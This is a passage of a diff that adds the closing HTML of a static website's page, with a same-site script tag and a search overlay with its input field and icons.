+  <script type="text/javascript" src="https://dunderhay.github.io/js/process.min.1d5a3f4a9583d31668d777478074c0526be93b07cc79f303dce0ecc502226b04072b27e78185a927a25fd226da1de5a457c13cb89c85596512bd500006ee7602.js" integrity="sha512-HVo/SpWD0xZo13dHgHTAUmvpOwfMefMD3ODsxQIiawQHKyfngYWpJ6Jf0ibaHeWkV8E8uJyFWWUSvVAABu52Ag=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://dunderhay.github.io/"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
